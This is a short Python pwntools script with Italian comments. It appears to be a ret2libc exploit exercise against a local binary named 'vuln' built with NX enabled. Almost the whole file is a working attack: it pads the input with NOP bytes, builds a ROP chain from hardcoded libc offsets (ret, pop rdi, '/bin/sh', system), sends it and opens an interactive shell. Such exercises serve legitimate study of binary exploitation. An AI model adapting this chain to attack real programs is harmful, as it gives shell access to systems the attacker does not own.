#Quando NX è abilitato
from multiprocessing import process
import sys
import struct
from pwn import *




p = process("./vuln")
#p64 lo uso perchè gli indirizzi non sono quelli che si aspetta il sistema, quindi li mette in un formato giusto e funzionante

# nop slides, così sto sicuro
nops = b"\x90"*216

libc_base_address = 0x00007ffff7dc4000
"""un altro modo per trovarlo è  ldd vuln2 e vedo l'indirizzo in cui viene caricata ma se ho le variabili di ambiente non funziona perchè mi sfasa gli indirizzi"""


pop_rdi = p64(libc_base_address + 0x23b6a)

system = p64(libc_base_address + 0x52290)

bin_sh = p64(libc_base_address + 0x1b45bd)

ret = p64(libc_base_address + 0xbe2f9) 


#faccio direttamente tutto, eseguo il binario con la payload
p.sendline(nops + ret + pop_rdi + bin_sh + system)

#apro il prompt dei comandi per fare cose in modo interattivo, va molto meglio
p.interactive()
